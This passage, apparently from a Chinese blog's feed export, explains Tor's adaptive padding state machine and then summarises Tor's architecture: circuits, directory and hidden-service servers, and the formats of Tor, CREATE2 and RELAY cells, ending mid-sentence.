Machine</code>的状态转移示意:(其中的S,B,G分别表示其实状态,<code>burst mode</code> 和<code>gap mode</code>)</p><img src="/images/tor-padding/12.png" alt="Histogram" style="zoom: 80%;" /><ul><li><strong>burst mode:</strong></li></ul><p>在起始状态(S)下,<code>client</code>正不断接收从服务器发回的真实数据,此时进入<code>burst mode</code>, 系统根据<code>HB</code>(<code>burst mode</code>对应的直方图)所给出的概率分布来选择一个发送时延<code>t</code> (此直方图是根据分析大量网络流量而形成的)(来自上一个<code>burst</code>的结束和下一个<code>burst</code>的开始之间的时间差的取样)</p><p>当此节点不断地处理真实数据包,系统会不断地根据<code>HB</code>来选择新的发送时延,不断重复, 系统会停留在<code>burst mode</code></p><p>如果在时延<code>t</code>的范围内没有处理到真实数据包,那么<code>Padding cell</code>将被发送,系统进入<code>gap mode</code></p><p>综上,在<code>burst mode</code>期间,如果发现了一个大于所选延时<code>t</code>的<code>IAT(inter-arrival time)</code> ,那么当前选择的延时<code>t</code>将失效,并且触发<code>gap mode</code></p> <br><ul><li><strong>gap mode:</strong></li></ul><p>在,通过<code>HG</code>来选择一个时延<code>t&#39;</code>,并且在时延结束时发送<code>Padding cell</code>, <code>HG</code>同样是通过对大量站点流量中<code>burst</code>内的<code>IAT(inter-arrival time)</code>取样来构建的(这是为了模拟正常<code>burst</code>中的<code>IAT</code>)</p><p>当接收到一个真实的数据包,或者在<code>HG</code>中选择到了一个来自<code>infinity bin</code>(上上图中最右侧的那个bin)范围中的时延值</p><p>此时系统会从<code>gap mode</code>转向<code>burst mode</code></p> <br><p>当在<code>burst mode</code>中,当从<code>HB</code>中选择到了一个来自<code>infinity bin</code>范围之中的时延值时,转向起始状态(S) (这种情况说明根据真实流量取样时,选择到了一个较大的<code>IAT</code>值,说明真实的通信双方当前已经停止通信或者处于其他数据包极其稀疏的阶段)</p><p>综上可知, Padding机制不会影响对真实的数据包的处理或转发(不应用时延), 处理一个真实的数据包意味着当前选择的时延值失效,</p><p>此时还会进行的操作: 在<code>HB</code>或<code>HG</code>中将<code>Token</code>返还给当前失效的时延值对应的<code>Bin</code>,并且从真实时延值对应的<code>Bin</code>处移除一个<code>Token</code>, 以此来校正分布</p><p>个人理解:如果收到真实数据包导致时延值失效,那么当前失效的时延值肯定大于收到这个包和收到上个包之间的<code>IAT</code>(也就是当前真实的时延),这说明当前仍处在频繁收到真实包的阶段,<strong>选择一个时延值时会”暂时拿走”一个其对应<code>Bin</code>的<code>Token</code></strong>,此时如果不校正的话,高时延<code>Bin</code>的<code>Token</code>减少了一个,那么下次选择时,选择到更低时延的<code>Bin</code>的可能性会增加,多次循环后,可能会导致系统倾向选择到极低的时延值,导致在<code>burst mode</code>还没来得及接收真实数据包,就进入了<code>gap mode</code>,最终导致真假数据包混合.  因此,校正操作是归还之前”暂时拿走”的<code>Token</code>,并移除一个更短的真实时延对应<code>Bin</code>的<code>Token</code>, 那么下次选择就不会趋向于选择更短时延的<code>Token</code></p><p>如果一个<code>Bin</code>的<code>Token</code>耗尽,那么在移除时会移除与之相邻的更大<code>Bin</code>的<code>Token</code></p><p>如果所有<code>Bin</code>的<code>Token</code>都耗尽,那么<code>HB</code>或者<code>HG</code>返回初始状态</p><p><br><br></p>]]></content>
      
      
      <categories>
          
          <category> Tor </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Tor </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>TOR原理的不完全总结</title>
      <link href="/post/75310f08.html"/>
      <url>/post/75310f08.html</url>
      
        <content type="html"><![CDATA[<h1 id="0-啥是Tor"><a href="#0-啥是Tor" class="headerlink" title="0_啥是Tor"></a>0_啥是Tor</h1><blockquote><p>Tor(<strong>The Onion Router,直译:洋葱路由器</strong>) 是用于实现匿名通信的软件, 是目前应用范围最广的匿名通信系统, 是通常所讲的「暗网」所依赖的底层技术. Tor本质上是为了保护用户的身份和访问内容等隐私信息而诞生的技术, 不仅可以用来访问暗网网站(域名一般以<code>.onion</code>结尾), 也可以用来访问普通的网站.</p><br><p>Tor网络是由分布在全球各地的由志愿者提供的中继节点组成的.  之所以叫做「洋葱」路由器, 是因为Tor对隐私的保护主要是通过「<strong>多层加密</strong>」和「<strong>多跳代理</strong>」来实现的, 当一个用户需要接入Tor网络时, 客户端会通过特殊算法选择若干组, 每一组共三个节点分别作为<code>入口节点(Guard Relay)</code>,  <code>中间节点(Middle Relay)</code>和<code>出口节点(Exit Relay)</code>来构成一条<code>Tor链路(circuit)</code>.  当用户使用浏览器访问了<code>www.google.com</code> 这样的普通网站时, 他的请求数据包会在本地进行多层加密后发送到一条<code>Tor链路(circuit)</code>上,   这个数据包接下来会依次被转发到<code>入口节点(Guard Relay)</code>,  <code>中间节点(Middle Relay)</code>和<code>出口节点(Exit Relay)</code>, 每到一个节点, 这个数据包就会被进行一层解密, 这个过程就像<strong>剥洋葱</strong>一样. 当数据在<code>出口节点(Exit Relay)</code>剥下最后一层洋葱皮后, <code>出口节点(Exit Relay)</code>就得到了明文的请求包, 然后它再去访问<code>www.google.com</code>的服务器. 服务器返回响应的过程也与此类似, 数据同样会在经过链路上的各个节点时经历一个「剥洋葱」的过程. </p><br><p>从上面的过程里就能够看出: 一个不怀好意的攻击者无论在链路上的任何一个位置截获数据包, 他都无法<strong>同时知道通信双方的身份以及通信的内容</strong>.  当然,前面也只是用户访问一个普通的互联网网站的过程. 如果这个用户在浏览器中输入的是URL以<code>.onion</code>结尾的暗网网站, 通信的过程还会更加复杂, 不仅仅是客户端, 另外一边的暗网服务器也会建立一个三条的链路, 然后服务器的链路和客户端的链路再通过一个称为<code>汇聚节点(RPO)</code>的路由器沟通. 这个多出来过程主要是为了保护暗网服务器的匿名性.</p></blockquote><br><p>想要访问暗网, 最简单的办法就是谷歌搜索Tor官网并下载Tor浏览器, 现在安装好浏览器之后的配置基本上都是傻瓜式的了. 不过在国内由于墙的存在, 大部分能够接入Tor网络的节点都被封锁了, 即使偶尔运气好能够连接上也是速度感人.  想体验的话一般还要先挂梯子或者使用Tor官方提供的网桥.. 当然,没有研究技术原理之类的特殊需求的话还是不要去尝试了.</p><img src="/images/tor-spec/image-20220819104351867.png" alt="image-20220819104351867" style="zoom:67%;" /><br><hr><br><h1 id="1-Tor的简要结构和工作流程"><a href="#1-Tor的简要结构和工作流程" class="headerlink" title="1_Tor的简要结构和工作流程"></a>1_Tor的简要结构和工作流程</h1><p><strong>(简单了解的话只看这一部分就行啦)</strong></p><img src="/images/tor-spec/1.png" alt="Tor网络的简单结构(出自:「匿名通信与暗网研究综述」罗军舟等)" style="zoom:67%;" /><h2 id="1-1组件介绍"><a href="#1-1组件介绍" class="headerlink" title="1.1组件介绍"></a><span style="font-size:25px;font-weight:bold">1.1组件介绍</span></h2><ul><li><code>客户端Client</code>:  <span style='color:black;background:yellow;font-family:hei;font-weight:bold'>(后面简称Client) </span>用户电脑上安装的本地程序(<strong>例如Tor浏览器</strong>), 将用户上网的数据封装成<code>Tor cell</code>并层层加密后发送出去.</li><li><code>洋葱路由器Onion Router</code>: <span style='color:black;background:yellow;font-family:hei;font-weight:bold'>(后面简称OR)</span> 由志愿者和官方提供的中继节点.  Tor的默认链路由三跳节点组成,分别为<code>入口节点Guard Relay</code><span style='color:black;background:yellow;font-family:hei;font-weight:bold'>(后面简称Entry)</span>, <code>中间节点Middle Relay</code><span style='color:black;background:yellow;font-family:hei;font-weight:bold'>(后面简称Middle)</span>和<code>出口节点Exit Relay</code><span style='color:black;background:yellow;font-family:hei;font-weight:bold'>(后面简称Exit)</span>. 其中<code>Entry</code>一般是可信度较高的守护节点.</li><li><code>隐藏服务器Hidden Server</code>: <span style='color:black;background:yellow;font-family:hei'><strong>(后面简称HS)</strong></span> 提供隐藏服务的服务器(简单来说就是那些暗网网站的服务器),必须使用Tor客户端接入Tor网络之后才能够访问到.</li><li><code>目录服务器Directory Server</code>: <span style='color:black;background:yellow;font-family:hei;font-weight:bold'>(后面简称DS)</span> 保存了所有<code>OR</code>的IP地址,带宽等信息. <code>Client</code>首次启动时要向其请求这些信息, 以便完成节点的选择和链路的建立.</li><li><code>隐藏服务目录服务器Hidden Service Directory</code>: <span style='color:black;background:yellow;font-family:hei;font-weight:bold'>(后面简称HSD)</span> 存储并向<code>client</code>提供<code>HS</code>的<code>引入节点IPO</code>和公钥等信息.</li><li><code>引入节点Introduction Point</code>: <span style='color:black;background:yellow;font-family:hei;font-weight:bold'>(后面简称IPO)</span> 由<code>HS</code>来选择的具有特殊功能的<code>OR</code>. 一个<code>HS</code>在开始接入Tor网络时, 就会选择三个<code>OR</code>来充当它的<code>IPO</code>, 并与这些<code>IPO</code>分别建立三跳的一般Tor链路. 当某个<code>Client</code>需要连接此<code>HS</code>时,<code>Client</code>会首先从<code>HSD</code>处取得同一个<code>HS</code>关联的<code>IPO</code>的信息, 并把这个<code>IPO</code>视为一个一般的服务器来与其建立三跳链路, 通过这条链路来发送关于<strong>客户端选择的<code>RPO</code>的信息</strong>以及同<code>HS</code>的<code>握手数据</code>. 这些数据会经由<code>IPO</code>中转给<code>HS</code>. </li><li><code>汇聚节点Rendezvous Point</code>: <span style='color:black;background:yellow;font-family:hei;font-weight:bold'>(后面简称RPO)</span> 由<code>Client</code>来选择的具有特殊功能的<code>OR</code>, 当一个<code>Client</code>需要连接某个<code>HS</code>时, 它会选择一个<code>OR</code>作为自己同<code>HS</code>的通信链路的汇聚点并与其建立三跳链路, <code>Client</code>将这个节点, 也就是<code>RPO</code>的信息通过<code>HS</code>的<code>IPO</code>告知给<code>HS</code>, 然后<code>HS</code>也会向<code>RPO</code>建立三跳链路. 由此形成的六跳链路就是最终<code>Client</code>和<code>HS</code>通信的链路.</li></ul><br><br><h2 id="1-2三跳访问的过程-用于访问一般的互联网网站"><a href="#1-2三跳访问的过程-用于访问一般的互联网网站" class="headerlink" title="1.2三跳访问的过程(用于访问一般的互联网网站)"></a><span style="font-size:25px;font-weight:bold">1.2三跳访问的过程(用于访问一般的互联网网站)</span></h2><img src="/images/tor-spec/2.png" alt="" style="zoom: 67%;" /><div align='center' style='font-family:hei;font-weight:bold'>    (Tor Client访问"维基百科"的过程)  </div><ol><li>用户开启了<code>Client</code>, <code>Client</code> 向<code>DS</code>请求当前活跃的<code>OR</code>的IP, 带宽等信息.</li><li><code>Client</code>通过 <span id="jiaquanluyou" style='color:black;background:yellow;font-family:hei;font-weight:bold'>基于加权随机的路由选择算法</span> 来选择三个<code>OR</code>并建立三跳链路 (建立三跳链路的详细过程见<a href="#part_4">后面的”建立连接”部分</a>)</li><li>访问数据在<code>Client</code>处被加密3次并发送给<code>Entry</code><span style='font-family:hei;font-weight:bold'>(这三次只是Tor对访问数据的加密,事实上Tor算是应用层的协议, 而这些数据按照计网的五层架构向下封装时, 还会被TLS等常见协议进行加密, 如果算上这个的话, 数据其实是被加密了4次的)</span></li><li>访问数据在三个节点处各进行一次解密, 最后<code>Exit</code>解密获得明文数据, 得知这些数据是用来访问 “维基百科” 的, 并获得这个服务器的IP和端口, <code>Exit</code>就会去同 “维基百科” 的服务器建立HTTP连接并发起访问.</li><li>服务器返回的数据在依次经过<code>Exit</code>,<code>Middle</code>,<code>Entry</code>的过程中会被它们使用各自同<code>Client</code>协商好的会话密钥层层加密,这样到达<code>Client</code>的数据又是经过了三层加密的「完整洋葱」, <code>Client</code>再使用自己的多个密钥对其进行依次解密.</li></ol><br><br><h2 id="1-3六跳访问的过程-用于访问暗网网站"><a href="#1-3六跳访问的过程-用于访问暗网网站" class="headerlink" title="1.3六跳访问的过程(用于访问暗网网站)"></a><span id= "part_1.3" style="font-size:25px;font-weight:bold">1.3六跳访问的过程(用于访问暗网网站)</span></h2><ol><li><code>HS</code>在选择三个<code>OR</code>作为自己的<code>IPO</code>, 并分别同它们建立三跳链路.</li><li><code>HS</code>将自己的<strong>服务描述符</strong>上传到<code>HSD</code>, <strong>服务描述符</strong>的内容包括自己<code>IPO</code>的信息和 <code>RSA公钥</code>.</li><li><code>Client</code>通过<code>HS</code>的域名<code>###.onion</code>进行访问时, 首先通过一个三跳链路访问<code>HSD</code>, 请求这个<code>HS</code>的<code>IPO</code>的信息和 <code>RSA公钥</code>.</li><li><code>Client</code>选择一个<code>OR</code>作为自己的<code>RPO</code>, 并与其建立三跳链路.</li><li><code>Client</code>建立到<code>IPO</code>的三跳链路, 并通过它将自己的<code>RPO</code>的信息以及<code>握手数据</code>发送给<code>IPO</code>, <code>IPO</code>再将这些信息发送给<code>HS</code>.</li><li><code>HS</code>建立到<code>RPO</code>的三跳链路, 并对此链路进行认证, 同时通过<code>RPO</code>向<code>Client</code>响应自己的<code>握手信息</code>.</li><li>至此, <code>Client</code>和<code>HS</code>可以通过这条由<code>RPO</code>沟通的六跳链路进行通信</li></ol><br><hr><br><h1 id="2-Tor网络组成结构的细节补充"><a href="#2-Tor网络组成结构的细节补充" class="headerlink" title="2_Tor网络组成结构的细节补充"></a>2_Tor网络组成结构的细节补充</h1><h2 id="2-1目录服务器DS"><a href="#2-1目录服务器DS" class="headerlink" title="2.1目录服务器DS"></a>2.1目录服务器DS</h2><img src="/images/tor-spec/3.png" alt="哪些服务器可以充当DS" style="zoom: 67%;" /><div align='center' style='font-family:hei;font-weight:bold'>    (哪些服务器可以充当DS,来自官方文档)  </div><p><span style='font-family:hei;font-weight:bold'>DS可以包括:</span></p><ul><li>权威的目录服务器,共9个,公开.</li><li>网桥目录服务器,匿名.</li><li>目录服务器的镜像(由一些普通的<code>OR</code>来充当),功能和权威的目录服务器一样,公开.</li><li>洋葱服务的目录服务器,也就是<code>HSD</code>,匿名</li></ul><br><p><span style='font-family:hei;font-weight:bold'>DS保存的内容包括:</span></p><ul><li>共识文档(consensus document): 当前Tor网络中每个<code>OR</code>的简要信息.</li><li>服务描述符(server descriptor): 当前Tor网络中每个<code>OR</code>的详细信息,包括公钥等.</li><li>额外信息(extra-info): 包括每个OR的补充信息 (例如历史时间戳等) .</li></ul><blockquote><p>前面提到<a href="#jiaquanluyou">Client使用加权路由选择算法来选择OR</a>依据的文件就是<code>共识文档(consensus document)</code>和<code>服务描述符(server descriptor)</code>, Client依据这两个文件提供的带宽信息和放缩因子计算各节点的加权值并按照<code>exit</code>,<code>entry</code>,<code>middle</code>的顺序选择节点 链路上任意两个节点应来自不同的c类网段</p></blockquote><p>每个<code>OR</code>都会签署和更新自己的<code>服务描述符(server descriptor)</code>,并每18小时将其上传到9个半信任的<strong>权威目录服务器</strong>中的每一个..</p><p>然后这些<strong>权威的目录服务器</strong>会整合自己已知的所有<code>OR</code>的信息并形成一个<code>共识文档(consensus document)</code>. 9个<strong>权威目录服务器</strong>之间会根据特定算法相互交流, 最后形成一致的<code>共识文档(consensus document)</code>, 并各自对其签名.</p><p>活跃的<code>OR</code>或者接入Tor网络的<code>Client</code>每个小时从<strong>权威目录服务器或者其镜像处</strong>下载一次<code>共识文档(consensus document)</code>(有时只下载发生变化的部分) 和过期的<code>服务描述符(server descriptor)</code></p><p><code>DS</code>是公开的, 允许<code>OR</code>或<code>Client</code>通过直连链路, 以<strong>HTTP</strong>的方式请求服务.</p><br><br><h2 id="2-2隐藏服务目录服务器HSD"><a href="#2-2隐藏服务目录服务器HSD" class="headerlink" title="2.2隐藏服务目录服务器HSD"></a>2.2隐藏服务目录服务器HSD</h2><p><span id="jiaquanluyou" style='color:black;background:yellow;font-family:hei;font-weight:bold'><code>HSD</code>并不是传统的中央服务器结构,而是DHT(分布式哈希表)结构</span></p><blockquote><img src="/images/tor-spec/4.png" alt="分布式哈希表"  /></blockquote><img src="/images/tor-spec/5.png" alt="分布式哈希表(出自:「匿名通信与暗网研究综述」罗军舟等)" style="zoom:67%;" /><p>Tor网络中的<code>HSD</code>是由一系列稳定快速且可信的<code>OR</code>来组成的DHT结构. 这些<code>OR</code>在<code>DS</code>保存的<code>共识文档(consensus document)</code>中拥有特殊的flag标记.</p><p><code>Client</code>通过要访问的URL:<code>&quot;###.onion&quot;</code>可以提取计算出该服务器的相关数据在哈希环上的存储位置, 然后去请求该位置上的<code>HSD</code>节点</p><br><hr><br><h1 id="3-Tor-cell"><a href="#3-Tor-cell" class="headerlink" title="3_Tor cell"></a>3_Tor cell</h1><h2 id="3-1结构"><a href="#3-1结构" class="headerlink" title="3.1结构"></a>3.1结构</h2><p><span id="jiaquanluyou" style='color:black;background:yellow;font-family:hei;font-weight:bold;font-size:25px'>Tor cell是Tor协议下通信的基本数据单元</span></p><img src="/images/tor-spec/6.png" alt="Tor cell的基本结构" style="zoom:67%;" /><p>其中, <code>Command</code>字段指示这个Tor cell要执行的功能, 其长度固定为1字节.</p><p><code>Circuit ID</code>字段用于确认此Tor cell和哪一条Tor链路相关联</p><p>在Tor version1-3中, <code>Circuit ID</code>字段的长度为2字节, 这样以来, 一个Tor cell的大小固定为<strong>512字节</strong>.</p><p>在Tor version4之后, <code>Circuit ID</code>字段的长度为4字节, 一个Tor cell的大小固定为<strong>514字节</strong>.</p><p>一般来说, 如果一个Tor cell的长度不足, 则在payload部分进行填充, 直到这个cell的大小达到固定的512或者514字节</p><p>也有一部分特殊的Tor cell (由几个特殊的Command字段值来标识, 该值为<strong>7或者大于128</strong>) 大小是可变的</p><br><h2 id="3-2Command字段的值和相关含义"><a href="#3-2Command字段的值和相关含义" class="headerlink" title="3.2Command字段的值和相关含义:"></a><span id="jiaquanluyou" style='font-family:hei;font-weight:bold;font-size:25px'>3.2Command字段的值和相关含义:</span></h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">长度固定的Tor cell可以使用的Command值:</span><br><span class="line">    0 -- PADDING     (Padding)         </span><br><span class="line">用于链路的keep alive, 如果当前没有其他流量,则Client和OR之间或者OR和OR之间每隔一段时间就要发送PADDING cells              1 -- CREATE      (Create a circuit)   用于Client创建链路    </span><br><span class="line">    2 -- CREATED     (Acknowledge create)     用于响应确认CREATE cell</span><br><span class="line">    3 -- RELAY       (End-to-end data)        最常见,用于传输数据</span><br><span class="line">    4 -- DESTROY     (Stop using a circuit)   </span><br><span class="line">    5 -- CREATE_FAST (Create a circuit, no PK) </span><br><span class="line">    6 -- CREATED_FAST (Circuit created, no PK) </span><br><span class="line">    8 -- NETINFO     (Time and address info)   </span><br><span class="line">    9 -- RELAY_EARLY (End-to-end data; limited)</span><br><span class="line">    10 -- CREATE2    (Extended CREATE cell)    </span><br><span class="line">    11 -- CREATED2   (Extended CREATED cell)   </span><br><span class="line">    12 -- PADDING_NEGOTIATE   (Padding negotiation)</span><br><span class="line">    </span><br><span class="line">长度可变的Tor cell可以使用的Command值:</span><br><span class="line">    7 -- VERSIONS    (Negotiate proto version) </span><br><span class="line">    128 -- VPADDING  (Variable-length padding) </span><br><span class="line">    129 -- CERTS     (Certificates)           </span><br><span class="line">    130 -- AUTH_CHALLENGE (Challenge value)    </span><br><span class="line">    131 -- AUTHENTICATE (Client authentication)</span><br><span class="line">    132 -- AUTHORIZE (Client authorization)    (Not yet used)</span><br></pre></td></tr></table></figure><p><strong>根据<code>Command</code>字段的值不同, 字节填充的模式也不同, 例如:</strong></p><ul><li>7(VERSION): payload中不能包含任何额外的填充字节</li><li>3&#x2F;9(RELAY&#x2F;RELAY_EARLY): 填充的字节为随机值</li><li>132(AUTHORIZE): 没有使用, 如何设置填充字节也没有指明</li><li>其他固定长度的Tor cell: 填充字节设为<code>NUL</code></li><li>其他可变长度的Tor cell: 填充字节设为<code>NUL</code></li></ul><p><br><br></p><h2 id="3-3CREATE-D-x2F-CREATE-D-2-cell"><a href="#3-3CREATE-D-x2F-CREATE-D-2-cell" class="headerlink" title="3.3CREATE(D)&#x2F;CREATE(D)2 cell"></a><span id="3.3" style="font-size:25px;font-weight:bold">3.3CREATE(D)&#x2F;CREATE(D)2 cell</span></h2><p>这部分开始是<a href="#part_4">第四部分建立链路过程的补充知识</a></p><p><code>CREATE(D)/CREATE(D)2 cell</code>一般用于相邻的两个节点之间用于建立链路的通信, 例如<code>Client</code>和<code>Entry</code>, <code>Entry</code>和<code>Middle</code>等等</p><p><code>CREATE(D)2</code>是<code>CREATE(D)</code>的更新版本, 其格式是可扩充的</p><p><code>CREATE2 cell</code>是由<strong>握手的发起方</strong>发送的, 其<strong>payload</strong>包含以下内容: </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">HTYPE     (Client Handshake Type)     [2 bytes] 握手类型</span><br><span class="line">HLEN      (Client Handshake Data Len) [2 bytes] 握手数据长度</span><br><span class="line">HDATA     (Client Handshake Data)     [HLEN bytes] 握手数据</span><br></pre></td></tr></table></figure><p><code>CREATED2 cell</code>是由<strong>握手的响应方</strong>发送的, 其<strong>payload</strong>包含以下内容:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">HLEN      (Server Handshake Data Len) [2 bytes] 握手数据长度</span><br><span class="line">HDATA     (Server Handshake Data)     [HLEN bytes] 握手数据</span><br></pre></td></tr></table></figure><br><p>其中<code>HTYPE</code>指示的握手类型包括:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0x0000  TAP  -- the original Tor handshake;</span><br><span class="line">0x0001  reserved</span><br><span class="line">0x0002  ntor -- the ntor+curve25519+sha256 handshake;</span><br></pre></td></tr></table></figure><p><br><br></p><h2 id="3-4RELAY-cell"><a href="#3-4RELAY-cell" class="headerlink" title="3.4RELAY cell"></a>3.4RELAY cell</h2><p><code>REALY cell</code>用于端到端 (end to end) 的通信</p><p><code>Client</code>可以向链路上的任何<code>OR</code>或服务器发送<code>REALY cell</code>, 其payload会使用每个途中经过的<code>OR</code>的会话密钥进行层层加密, 只有此cell的接收者才能最终解密得到明文的payload. </p><p>结构: (<strong>其中灰色部分是该<code>RELAY cell</code>的接收者才能最终解密看见的内容</strong>)</p><img id= "RELAY_cell" src="/images/tor-spec/8.png" alt="relay cell的基本结构" style="zoom:80%;" /><p>上图中可以看见, 除了Tor cell本身的 <code>Command</code>命令字段之外, <code>RELAY cell</code>内部还有一个自己的命令字段</p><p>其中,<code>STREAM ID</code>字段值一般由<code>Client</code>来选择, 通常是非0值, 如果该值为0,那么该流被视为是”控制流”,即能够对整条链路的数据传输产生影响</p><p><span id= "relay_command"><code>Relay Command</code>字段值一览:</span></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">1 -- RELAY_BEGIN     [forward] 用于告知服务器开始传输应用数据</span><br><span class="line">2 -- RELAY_DATA      [forward or backward] 用于传输应用数据</span><br><span class="line">3 -- RELAY_END       [forward or backward]</span><br><span class="line">4 -- RELAY_CONNECTED [backward] 用于服务器对RELAY_BEGIN进行响应</span><br><span class="line">5 -- RELAY_SENDME    [forward or backward] [sometimes control]</span><br><span class="line">6 -- RELAY_EXTEND    [forward]             [control]  </span><br><span class="line">7 -- RELAY_EXTENDED  [backward]            [control]</span><br><span class="line">8 -- RELAY_TRUNCATE  [forward]             [control]</span><br><span class="line">9 -- RELAY_TRUNCATED [backward]            [control]</span><br><span class="line">10 -- RELAY_DROP      [forward or backward] [control]</span><br><span class="line">11 -- RELAY_RESOLVE   [forward]</span><br><span class="line">12 -- RELAY_RESOLVED  [backward]</span><br><span class="line">13 -- RELAY_BEGIN_DIR [forward]</span><br><span class="line">14 -- RELAY_EXTEND2   [forward]             [control]</span><br><span class="line">15 -- RELAY_EXTENDED2 [backward]            [control]</span><br><span class="line"></span><br><span class="line">16..18 -- Reserved for UDP; Not yet in use, see prop339.</span><br><span class="line"></span><br><span class="line">32-40 -- 用于IPO和RPO链路:</span><br><span class="line">  32 -- RELAY_COMMAND_ESTABLISH_INTRO</span><br><span class="line">Sent from hidden service host to introduction point; establishes introduction point. </span><br><span class="line">            </span><br><span class="line">      33 -- RELAY_COMMAND_ESTABLISH_RENDEZVOUS</span><br><span class="line">Sent from client to rendezvous point; creates rendezvous point. </span><br><span class="line">            </span><br><span class="line">      34 -- RELAY_COMMAND_INTRODUCE1</span><br><span class="line">Sent from client to introduction point; requests introduction.</span><br><span class="line">            </span><br><span class="line">      35 -- RELAY_COMMAND_INTRODUCE2</span><br><span class="line">Sent from introduction point to hidden service host; requests introduction. Same format as INTRODUCE1. </span><br><span class="line">            </span><br><span class="line">      36 -- RELAY_COMMAND_RENDEZVOUS1</span><br><span class="line">Sent from hidden service host to rendezvous point; attempts to join host&#x27;s circuit to client&#x27;s circuit. </span><br><span class="line"></span><br><span class="line">      37 -- RELAY_COMMAND_RENDEZVOUS2</span><br><span class="line">Sent from rendezvous point to client; reports join of host&#x27;s circuit to client&#x27;s circuit.</span><br><span class="line"></span><br><span class="line">      38 -- RELAY_COMMAND_INTRO_ESTABLISHED</span><br><span class="line">Sent from introduction point to hidden service host; reports status of attempt to establish introduction point. </span><br><span class="line">      39 -- RELAY_COMMAND_RENDEZVOUS_ESTABLISHED</span><br><span class="line">Sent from rendezvous point to client; acknowledges receipt of ESTABLISH_RENDEZVOUS cell. </span><br><span class="line"></span><br><span class="line">      40 -- RELAY_COMMAND_INTRODUCE_ACK</span><br><span class="line">Sent from introduction point to client; acknowledges receipt of INTRODUCE1 cell and reports success/failure.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">41-42 -- 用于链路填充,具体见第5部分</span><br><span class="line"></span><br><span class="line">Used for flow control; see Section 4 of prop324.</span><br><span class="line">43 -- XON             [forward or backward]</span><br><span class="line">44 -- XOFF            [forward or backward]</span><br><span class="line"></span><br></pre></td></tr></table></figure><br><h3 id="3-4-1-Digest-Recognized字段以及加密机制"><a href="#3-4-1-Digest-Recognized字段以及加密机制" class="headerlink" title="3.4.1 Digest, Recognized字段以及加密机制"></a><span id="part_3.4.1">3.4.1 Digest, Recognized字段以及加密机制</span></h3><blockquote><p><code>Digest</code>长度为4字节, <code>Recognized</code>长度为2字节</p><p>为保证端到端通信的完整性,<code>Client</code>会截取自己**运行摘要(running digest)**的前4字节,写入<code>RELAY cell</code>的<code>digest</code>字段. <code>OR</code>收到之后,会将其取出并同自己计算出的运行摘要来比较.</p><p><code>recognized</code>字段用于指示该cell是否仍是被加密的.  一般来说,如果该cell的<code>recognized</code>字段是非0值,<strong>说明payload仍是被加密的</strong>, 此时当前<code>OR</code>应该继续将该cell发送给下一个<code>OR</code> (<strong>注意这样的检查有一定的概率出现错误, 因为此时recognized字段有2^-16的概率恰好为0</strong>)</p><p>因此, 如果<code>recognized</code>字段的值为0, 为了避免可能发生的错误 (尽管概率很小) <code>OR</code>会继续检查<code>digest</code>字段的值是否匹配</p><p>如果<code>recognized</code>值为0,而<code>digest</code>值不匹配, 说明当前的<code>OR</code>并不是这个<code>RELAY cell</code>的接收者, 那么<code>OR</code>应该继续向下传递该cell</p><br><p>假设<code>Client</code>想要给第三个<code>OR</code>(也就是<code>Exit</code>)发送 <code>RELAY cell</code>,那么<code>Client</code>会依次使用这个<code>Exit</code>以及其前面的<code>OR</code>的<strong>会话密钥</strong>迭代加密payload</p><p>该<code>RELAY cell</code>被发送到第一个<code>OR</code>时,第一个<code>OR</code>会对其进行第一次解密,<strong>检查解密后的<code>Recognized</code>字段的值是否是0以及<code>digest</code>字段是否能够正确匹配</strong></p><p>如果不合要求, 则该<code>OR</code>会将解密后的payload部分(也就是<a href="#RELAY_cell">前面图中的灰色部分</a>)封装到一个新的Tor cell中(<strong>也就是添加Tor cell最前面的<code>circuitID</code>和<code>Command</code>字段</strong>)并向下转发.</p><p>直到第三个<code>OR</code>接收到这个cell,解密后检查<code>recognized</code>字段的值为0 , 并且<code>digest</code>字段能够匹配</p><p>此时这个<code>OR</code>会根据<code>Relay Command</code>的值以及<code>data</code>部分的内容来执行相应的操作</p><br><p>从<code>Client</code>处进行被层层加密的是其实只是长度为<strong>509B</strong>的payload部分, Tor链路上的每一个<code>OR</code>都能够识别前面的<code>Circuit ID</code>和<code>Command</code>字段, 